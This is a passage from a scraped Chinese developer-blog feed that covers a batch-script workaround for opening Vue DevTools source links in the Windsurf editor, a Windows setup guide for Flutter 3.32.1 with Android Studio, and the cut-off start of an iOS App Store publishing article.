<p>但这时，会调用 Vue DevTools  的 launch-editor ，不过：</p>
<ul>
<li>
<p><strong>launch-editor 的视角</strong>：Vue DevTools 它本身内置了一份“知名编辑器名单”（如 VS Code, WebStorm）并没有我们要的这个。所以当它识别出你在使用名单外的编辑器（Windsurf 目前尚未被收录）时，它会启动<strong>通用回退策略</strong>。它会把文件名、行号、列号当作三个<strong>独立参数</strong>发送出去： <code>cmd args: [filename, line, column]</code></p>
</li>
<li>
<p><strong>Windsurf (VS Code系) 的视角</strong>：作为 VS Code 的 AI 分支，Windsurf 继承了严格的命令行规范。它默认认为传入的所有参数都是<strong>文件路径</strong>。除非你显式告诉它“我要定位行列”，否则它不会把数字当做行号。</p>
<ul>
<li>它收到了 <code>filename</code> -&gt; 打开了源代码文件（正确）。</li>
<li>它收到了 <code>line</code> (比如 40) -&gt; 它以为你要打开一个名字叫 <code>40</code> 的文件 -&gt; <strong>打开了空文件</strong>。</li>
<li>它收到了 <code>column</code> (比如 12) -&gt; 它以为你要打开一个名字叫 <code>12</code> 的文件 -&gt; <strong>打开了空文件</strong>。</li>
</ul>
</li>
</ul>
<p><strong>正确的沟通方式</strong>应该是将它们打包成一个参数，并加上 <code>-g</code> (goto) 标记： <code>windsurf -g filename:line:column</code></p>
<h4 data-id="heading-1">Vue DevTools 中<code>launch-editor</code> 的已知编辑器参数映射表（示例）</h4>









































<table><thead><tr><th><strong>编辑器标识 (Key)</strong></th><th><strong>进程名</strong></th><th><strong>典型参数格式</strong></th><th><strong>备注</strong></th></tr></thead><tbody><tr><td><code>code</code></td><td><code>Code.exe</code> / <code>Electron</code></td><td><code>-g {file}:{line}:{column}</code></td><td>VS Code 规范</td></tr><tr><td><code>webstorm</code></td><td><code>webstorm64.exe</code></td><td><code>--line {line} {file}</code></td><td>JetBrains 规范</td></tr><tr><td><code>sublime</code></td><td><code>subl</code></td><td><code>{file}:{line}:{column}</code></td><td>Sublime Text 规范</td></tr><tr><td><code>atom</code></td><td><code>atom</code></td><td><code>{file}:{line}:{column}</code></td><td>Atom 规范</td></tr><tr><td><strong>Unknown</strong></td><td>(任意未知程序)</td><td><code>{file} {line} {column}</code></td><td><strong>通用回退策略</strong></td></tr></tbody></table>
<h3 data-id="heading-2"/>
<h2 data-id="heading-3">2. 解决方案：中间适配脚本</h2>
<p>既然官方暂时没有适配，我们可以在中间加一个小小的“翻译官”（Batch 脚本）。这个脚本负责接收 Vue DevTools 发来的三个参数，将它们重新组装成 Windsurf 能听懂的格式，再转发给 Windsurf。</p>
<h3 data-id="heading-4">第一步：创建适配脚本</h3>
<p>在你电脑上任意位置（建议放在不常变动的文件夹，例如 <code>C:\</code>），新建一个名为 <code>windsurf-launch.cmd</code> 的文件，并将以下代码完整复制进去。</p>
<p><strong>注意</strong>：代码中已经硬编码了我自己的 Windsurf 绝对路径。你们需要修改自己的</p>
<pre><code class="hljs language-less" lang="less"><span class="hljs-variable">@echo</span> off
<span class="hljs-variable">@echo</span> off
set FILE_PATH=%~<span class="hljs-number">1</span>
set LINE=%<span class="hljs-number">2</span>
set COLUMN=%<span class="hljs-number">3</span>

<span class="hljs-string">"C:\Users\Administrator\AppData\Local\Programs\Windsurf\Windsurf.exe"</span> -g <span class="hljs-string">"%FILE_PATH%:%LINE%:%COLUMN%"</span>

exit /b
</code></pre>
<p>我给脚本放 c:\ 下了。</p>
<h3 data-id="heading-5">第二步：修改 vite 的配置</h3>
<p>直接修改 vite 的配置，使用如下</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">import</span> { defineConfig } <span class="hljs-keyword">from</span> <span class="hljs-string">"vite"</span>;
<span class="hljs-keyword">import</span> vue <span class="hljs-keyword">from</span> <span class="hljs-string">"@vitejs/plugin-vue"</span>;
<span class="hljs-keyword">import</span> <span class="hljs-title class_">UnoCSS</span> <span class="hljs-keyword">from</span> <span class="hljs-string">"unocss/vite"</span>;
<span class="hljs-keyword">import</span> <span class="hljs-title class_">VueDevTools</span> <span class="hljs-keyword">from</span> <span class="hljs-string">"vite-plugin-vue-devtools"</span>;
<span class="hljs-keyword">import</span> { fileURLToPath, <span class="hljs-variable constant_">URL</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">"node:url"</span>;

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title function_">defineConfig</span>(<span class="hljs-function">(<span class="hljs-params">{ mode }</span>) =&gt;</span> ({
  <span class="hljs-attr">plugins</span>: [
    <span class="hljs-title function_">vue</span>(),
    <span class="hljs-title class_">VueDevTools</span>({
      <span class="hljs-attr">launchEditor</span>: <span class="hljs-string">"C:\\windsurf-launch.cmd"</span>,
    }),
    <span class="hljs-title class_">UnoCSS</span>(),
  ]
}));
</code></pre>
<p>直接使用 launchEditor: "C:\windsurf-launch.cmd" 来启动。</p>
<ol>
<li>点击确定保存。</li>
</ol>
<h3 data-id="heading-6">第三步：验证与重启</h3>
<ol>
<li><strong>重启你的终端</strong>（VS Code 的终端或 CMD/PowerShell），以便加载新的环境变量。</li>
<li>重新运行 <code>npm run dev</code> 启动你的 Vue 项目。</li>
<li>在浏览器中打开 Vue DevTools，点击组件审查图标，选择一个组件。</li>
<li>你会发现 Windsurf 瞬间弹出，并且光标精准地闪烁在对应的代码行上，再也没有奇怪的数字 Tab 了。</li>
</ol>
<hr/>
<p><strong>总结</strong>：我们通过一个简单的 <code>.cmd</code> 脚本，弥合了通用启动协议与 Windsurf 专用协议之间的差异。就可以开心的使用这个模块了。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Flutter 3.32.1 开发环境搭建]]></title>    <link>https://juejin.cn/post/7575751471842803748</link>    <guid>https://juejin.cn/post/7575751471842803748</guid>    <pubDate>2025-11-24T06:01:47.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575751471842803748" data-draft-id="7575735719075790854" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Flutter 3.32.1 开发环境搭建"/> <meta itemprop="keywords" content="Flutter"/> <meta itemprop="datePublished" content="2025-11-24T06:01:47.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="小恒恒"/> <meta itemprop="url" content="https://juejin.cn/user/3315782798023224"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Flutter 3.32.1 开发环境搭建
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3315782798023224/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    小恒恒
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-24T06:01:47.000Z" title="Mon Nov 24 2025 06:01:47 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-24
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">1. 环境版本</h2>

















<table><thead><tr><th>软件</th><th>版本号</th></tr></thead><tbody><tr><td>Flutter</td><td>3.32.1</td></tr><tr><td>Android Studio</td><td>android-studio-2022.3.1.18-windows</td></tr></tbody></table>
<p><em>本机操作系统为 Win10</em></p>
<h2 data-id="heading-1">2. 安装 Android Studio</h2>
<p>直接安装，选择好目录后下一步即可。</p>
<p>运行 <code>Android Studio</code> 选择 <code>Custom</code> 安装 ，不要更改C盘目录，会导致下载失败，漫长地下载完成后，安装 <code>Command-line Tools</code> 。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c83802e8892145649fd76b99a588d269~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP5oGS5oGS:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764568907&amp;x-signature=EAz0zLGCOKOdK%2BK7xUskX%2Bulihs%3D" alt="image.png" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4dad62ae724a4970a5e3700351b181c2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP5oGS5oGS:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764568907&amp;x-signature=sZ2%2BfE52YaRUlnoHsYEcI1lSesE%3D" alt="image.png" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3f7b7d9c3e6f4cbfb6efb13c3076d6c1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP5oGS5oGS:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764568907&amp;x-signature=gRvwq9kb0UwWN9LW8cmHBqEH5CM%3D" alt="image.png" loading="lazy"/></p>
<p>如果安装失败了，你也可以在<a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.android.com%2Fstudio%3Fhl%3Dzh-cn%23command-line-tools-only" target="_blank" title="https://developer.android.com/studio?hl=zh-cn#command-line-tools-only" ref="nofollow noopener noreferrer">官网</a>下载，并把它放在SDK所在目录下即可。</p>
<p>下面是配置一些环境变量，先给 SDK 单独添加一个变量：</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-attr">ANDROID_HOME</span>=C:\Users\LvHeng\AppData\Local\Android\Sdk
</code></pre>
<p>然后再在PATH环境变量中添加：</p>
<pre><code class="hljs language-perl" lang="perl">%ANDROID_HOME%\platform-tools
%ANDROID_HOME%\tools
%ANDROID_HOME%\build-tools\<span class="hljs-number">36.1</span>.<span class="hljs-number">0</span>
</code></pre>
<p>添加 <code>ANDROID_SDK_HOME</code> 变量以规定创建 Android 模拟器的位置；添加 <code>GRADLE_USER_HOME</code> 规定Gradle 依赖下载的位置。这两个操作都可以减少C盘的负担。</p>
<h2 data-id="heading-2">3. 安装 flutter</h2>
<p>flutter 只需要把压缩包解压缩，然后配置系统环境：</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-attr">PUB_HOSTED_URL</span>=https://pub.flutter-io.cn
<span class="hljs-attr">FLUTTER_STORAGE_BASE_URL</span>=https://storage.flutter-io.cn
<span class="hljs-attr">PUB_CACHE</span>=E:\FlutterPubCache
<span class="hljs-attr">FLUTTER_HOME</span>=D:\flutter_windows_3.<span class="hljs-number">32.1</span>-stable\flutter
</code></pre>
<p>现在需要在环境变量中添加：</p>
<pre><code class="hljs language-perl" lang="perl">%FLUTTER_HOME%\bin
</code></pre>
<p>此时再打开 PowerShell 运行 <code>flutter doctor</code>，应该只会提示这样的内容：</p>
<pre><code class="hljs language-less" lang="less"><span class="hljs-selector-tag">Flutter</span> <span class="hljs-selector-tag">assets</span> <span class="hljs-selector-tag">will</span> <span class="hljs-selector-tag">be</span> <span class="hljs-selector-tag">downloaded</span> <span class="hljs-selector-tag">from</span> <span class="hljs-selector-tag">https</span>:<span class="hljs-comment">//storage.flutter-io.cn. Make sure you trust this source!</span>
<span class="hljs-selector-tag">Doctor</span> <span class="hljs-selector-tag">summary</span> (to see all details, run flutter doctor -v):
<span class="hljs-selector-attr">[√]</span> <span class="hljs-selector-tag">Flutter</span> (Channel stable, <span class="hljs-number">3.32</span>.<span class="hljs-number">1</span>, on Microsoft Windows [版本 <span class="hljs-number">10.0</span>.<span class="hljs-number">19045.6332</span>], locale zh-CN)
<span class="hljs-selector-attr">[√]</span> <span class="hljs-selector-tag">Windows</span> <span class="hljs-selector-tag">Version</span> (<span class="hljs-number">10</span> 专业版 <span class="hljs-number">64</span>-bit, <span class="hljs-number">22</span>H2, <span class="hljs-number">2009</span>)
<span class="hljs-selector-attr">[!]</span> <span class="hljs-selector-tag">Android</span> <span class="hljs-selector-tag">toolchain</span> <span class="hljs-selector-tag">-</span> <span class="hljs-selector-tag">develop</span> <span class="hljs-selector-tag">for</span> <span class="hljs-selector-tag">Android</span> <span class="hljs-selector-tag">devices</span> (Android SDK version <span class="hljs-number">36.1</span>.<span class="hljs-number">0</span>)
    ! <span class="hljs-selector-tag">Some</span> <span class="hljs-selector-tag">Android</span> <span class="hljs-selector-tag">licenses</span> <span class="hljs-selector-tag">not</span> <span class="hljs-selector-tag">accepted</span>. <span class="hljs-selector-tag">To</span> <span class="hljs-selector-tag">resolve</span> <span class="hljs-selector-tag">this</span>, <span class="hljs-selector-tag">run</span>: <span class="hljs-selector-tag">flutter</span> <span class="hljs-selector-tag">doctor</span> <span class="hljs-selector-tag">--android-licenses</span>
<span class="hljs-selector-attr">[√]</span> <span class="hljs-selector-tag">Chrome</span> <span class="hljs-selector-tag">-</span> <span class="hljs-selector-tag">develop</span> <span class="hljs-selector-tag">for</span> <span class="hljs-selector-tag">the</span> <span class="hljs-selector-tag">web</span>
<span class="hljs-selector-attr">[X]</span> <span class="hljs-selector-tag">Visual</span> <span class="hljs-selector-tag">Studio</span> <span class="hljs-selector-tag">-</span> <span class="hljs-selector-tag">develop</span> <span class="hljs-selector-tag">Windows</span> <span class="hljs-selector-tag">apps</span>
    <span class="hljs-selector-tag">X</span> <span class="hljs-selector-tag">Visual</span> <span class="hljs-selector-tag">Studio</span> <span class="hljs-selector-tag">not</span> <span class="hljs-selector-tag">installed</span>; <span class="hljs-selector-tag">this</span> <span class="hljs-selector-tag">is</span> <span class="hljs-selector-tag">necessary</span> <span class="hljs-selector-tag">to</span> <span class="hljs-selector-tag">develop</span> <span class="hljs-selector-tag">Windows</span> <span class="hljs-selector-tag">apps</span>.
      <span class="hljs-selector-tag">Download</span> <span class="hljs-selector-tag">at</span> <span class="hljs-selector-tag">https</span>:<span class="hljs-comment">//visualstudio.microsoft.com/downloads/.</span>
      <span class="hljs-selector-tag">Please</span> <span class="hljs-selector-tag">install</span> <span class="hljs-selector-tag">the</span> "<span class="hljs-selector-tag">Desktop</span> <span class="hljs-selector-tag">development</span> <span class="hljs-selector-tag">with</span> <span class="hljs-selector-tag">C</span>++" <span class="hljs-selector-tag">workload</span>, <span class="hljs-selector-tag">including</span> <span class="hljs-keyword">all</span> <span class="hljs-selector-tag">of</span> <span class="hljs-selector-tag">its</span> <span class="hljs-selector-tag">default</span> <span class="hljs-selector-tag">components</span>
<span class="hljs-selector-attr">[√]</span> <span class="hljs-selector-tag">Android</span> <span class="hljs-selector-tag">Studio</span> (version <span class="hljs-number">2022.3</span>)
<span class="hljs-selector-attr">[√]</span> <span class="hljs-selector-tag">IntelliJ</span> <span class="hljs-selector-tag">IDEA</span> <span class="hljs-selector-tag">Community</span> <span class="hljs-selector-tag">Edition</span> (version <span class="hljs-number">2022.3</span>)
<span class="hljs-selector-attr">[√]</span> <span class="hljs-selector-tag">Connected</span> <span class="hljs-selector-tag">device</span> (<span class="hljs-number">3</span> available)
<span class="hljs-selector-attr">[√]</span> <span class="hljs-selector-tag">Network</span> <span class="hljs-selector-tag">resources</span>

! <span class="hljs-selector-tag">Doctor</span> <span class="hljs-selector-tag">found</span> <span class="hljs-selector-tag">issues</span> <span class="hljs-selector-tag">in</span> <span class="hljs-number">2</span> <span class="hljs-selector-tag">categories</span>.
</code></pre>
<p>由于我们只需要开发移动端，所以可以不用管 Visual Studio 的报错。现在需要按照提示运行 <code>flutter doctor --android-licenses</code>，接下来你就按照提示一路 y 同意即可，不同意你也干不了这活儿。</p>
<p>好的，现在我们回到 Android Studio ，开始安装 <code>Flutter</code> 插件：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c68de100b83a41cda1682a7431106b5a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP5oGS5oGS:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764568907&amp;x-signature=u4IEcO09QEp319LlUrQHqTCFg2o%3D" alt="image.png" loading="lazy"/></p>
<p>安装完以后，会显示能新建 Flutter 项目：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/72cca5d54834407aa3105dc429257122~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP5oGS5oGS:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764568907&amp;x-signature=bJqg2Mc9oYg%2FcBd%2BfxDARjmizKM%3D" alt="image.png" loading="lazy"/></p>
<p>这里我们在新建时，需要指定一下 Flutter Home ：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2947457f4ef941e38200a41f18ad68d3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP5oGS5oGS:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764568907&amp;x-signature=rJm33pg%2Busd7EEq4UUKWvhiCWnc%3D" alt="image.png" loading="lazy"/></p>
<p>创建项目时，记得去掉自己不要的内容，并且记得离线创建（更新版本的AndroidStudio已默认离线创建）。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b3a93550acfc4a46baa6fa870216ab2b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP5oGS5oGS:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764568907&amp;x-signature=dh51Xv9QLCrvMVka6bQd2BWt8Eo%3D" alt="image.png" loading="lazy"/></p>
<h2 data-id="heading-3">4. 开始调试</h2>
<p>各大厂商安卓机开启开发者模式略有不同，请大家根据自身情况来搜索一下吧，不难的。手机上配置好后，找一条原厂的数据线或者买一条第三方（如绿联）出的数据线连上手机就可以开始调试了。另外，首次连接调试时，手机会蹦出弹框让你确认可以调试。</p>
<p><strong>由于<code>AndroidStudio</code>是吞噬内存的猛兽，真心建议大家使用16G内存以上的电脑进行开发！</strong></p>
<p>我们假设你拥有32G内存，你就可以这样分配给它8G：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b81c6d4d5018452aa9aac6781bbb5401~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP5oGS5oGS:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764568907&amp;x-signature=hZyA2AislPJUCg3ITPifa7%2BPR7Y%3D" alt="image.png" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/333083747ebb4da3ae5f6aafbdd49194~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP5oGS5oGS:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764568907&amp;x-signature=JcNPn%2BcMBUGh%2Bmr97%2BFYaoSzSJ8%3D" alt="image.png" loading="lazy"/></p>
<p>接下来就是漫长地等待时间，当你的手机上出现了：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f7cae1fbaffc440cac2392df0d4c8fc6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP5oGS5oGS:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764568907&amp;x-signature=xBCXGhve678eDWbV1awV6QXhwUc%3D" alt="222d3dea86a0d9a75b52ad1f8b70f24e.jpg" loading="lazy"/></p>
<p>成功了！</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[iOS 商店上架全流程解析 从工程准备到审核通过的系统化实践指南]]></title>    <link>https://juejin.cn/post/7576070987293147182</link>    <guid>https://juejin.cn/post/7576070987293147182</guid>    <pubDate>2025-11-24T08:01:51.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7576070987293147182" data-draft-id="7575718948299489331" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="iOS 商店上架全流程解析 从工程准备到审核通过的系统化实践指南"/> <meta itemprop="keywords" content="后端"/> <meta itemprop="datePublished" content="2025-11-24T08:01:51.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="00后程序员"/> <meta itemprop="url" content="https://juejin.cn/user/1159358440539900"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            iOS 商店上架全流程解析 从工程准备到审核通过的系统化实践指南
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1159358440539900/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    00后程序员
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-24T08:01:51.000Z" title="Mon Nov 24 2025 08:01:51 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-24
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body 